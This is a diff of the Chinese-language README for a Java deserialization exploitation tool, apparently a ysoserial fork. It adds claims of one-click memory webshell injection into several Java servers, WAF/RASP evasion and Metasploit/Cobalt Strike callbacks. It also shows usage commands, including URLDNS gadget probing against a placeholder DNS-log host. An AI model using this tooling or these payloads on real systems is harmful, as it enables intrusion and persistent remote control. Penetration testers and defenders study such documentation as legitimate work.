@@ -18,11 +18,10 @@
 2. 利用链的扩充和丰富：在原版基础上添加了多条利用链，扩展利用方式，更够在依赖不确定、利用方式有限制的情况扩展更多的攻击路径；
 3. 利用方式的填充：原版的利用链的利用方式仅使用了 Runtime 执行系统命令，本项目添加了多种利用方式，并支持执行自定义任意代码；
 4. 利用链探测：本项目在 URLDNS 中添加了利用链的探测，在攻击中不再盲目乱打，先通过 DNSLOG 检测类名，再执行攻击；
-5. 内存马：本项目在利用时，对于部分链支持了一键打入 Spring/Tomcat 内存马功能，内存马支持命令执行、冰蝎、哥斯拉三种利用方式；并支持 Tomcat 回显命令执行、Neoreg 流量隧道内存马；
+5. 内存马：本项目在利用时，对于部分链支持了一键打入 Spring/Tomcat/Jetty/JBoss/Resin/Websphere 内存马功能，内存马支持命令执行、冰蝎、哥斯拉三种利用方式；并支持 Tomcat 回显命令执行、Neoreg 流量隧道内存马；
 6. 防御绕过：在部分系统中使用了 WAF/RASP 等防御模式，本项目去除大多数原版特征，并在执行恶意动作时使用了多种能够绕过 RASP 的执行方式，绕过防护；
-7. MSF/CS 上线：配合远程 Jar 包一键上线 MSF/CS 的功能，集成一体，快人一步。
-
-
+7. MSF/CS 上线：配合远程 Jar 包一键上线 MSF/CS 的功能，集成一体，快人一步
+8. 使用去除编译类字节码行号、Javassist 动态添加父类等多种技术缩小反序列化 payload。
 
 项目支持利用链展示：
 
@@ -316,12 +315,19 @@ java -jar ysuserial-0.1-su18-all.jar CommonsBeanutils2 'open -a Calculator.app'
 | linux<br />windows                          | winlinux                | sun.awt.X11.AwtGraphicsConfigData<br />sun.awt.windows.WButtonPeer | windows/linux版本判断                                        |
 |                                             | all                     |                                                              | 全部检测                                                     |
 
+本项目参考了 kezibei 师傅的 URLDNS 项目，实际情况可能有如下几种情况导致问题：
+- 反序列时遇到黑名单，可能导致后面的类的 dnslog 出不来；
+- 反序列化流程中由于种种情况报错可能导致出不来。
 
+因此这里还是提供了 all/common/指定类 三种探测方式：
+- all：探测全部的类；
+- common：探测不常在黑名单中的 CommonsBeanutils2/C3P0/AspectJWeaver/bsh/winlinux；
+- 指定类：使用对应链中的关键字 CommonsCollections24:xxxx.dns.log 。
 
-示例：
+示例：`all:xxxxxx.dns.log`
 
 ```shell
-java -jar ysuserial-0.1-su18-all.jar URLDNS 'xxxxxx.dns.log'
+java -jar ysuserial-0.1-su18-all.jar URLDNS 'all:xxxxxx.dns.log'
 ```
 
 
